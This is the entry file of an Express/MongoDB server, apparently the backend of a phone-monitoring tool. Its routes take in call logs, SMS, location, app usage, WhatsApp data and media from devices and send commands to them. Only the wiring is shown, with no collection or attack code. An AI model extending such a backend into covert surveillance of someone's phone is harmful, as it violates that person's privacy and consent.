require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const authRouter = require('./routes/auth');
const contactsRouter = require('./routes/contacts');
const dataRouter = require('./routes/data');
const mediaRouter = require('./routes/media');
const commandsRouter = require('./routes/commands');
const devicesRouter = require('./routes/devices');

const updateLastSeen = require('./middlewares/updateLastSeen');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Serve frontend
app.use(express.static(path.join(__dirname, '..', 'public')));

// Connect to MongoDB
(async () => {
  try {
    const uri = process.env.MONGODB_URI;
    if (!uri) throw new Error('MONGODB_URI not set');
    await mongoose.connect(uri, { dbName: 'monitor' });
    console.log('MongoDB connected');
  } catch (e) {
    console.error('MongoDB connection error', e);
    process.exit(1);
  }
})();

// apply updateLastSeen middleware to device data routes
app.use('/api', updateLastSeen);

// routes
app.use('/api/auth', authRouter);
app.use('/api/contacts', contactsRouter);
app.use('/api', dataRouter);        // /call /sms /location /app-usage /whatsapp
app.use('/api', mediaRouter);       // /media/upload /media, /media/:id
app.use('/api', commandsRouter);    // /commands/poll /commands/ack /device/:deviceId/command
app.use('/api', devicesRouter);     // /devices /devices/:deviceId/claim

// fallback
app.get('/api', (req, res) => res.json({ ok: true }));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server listening on ${PORT}`));
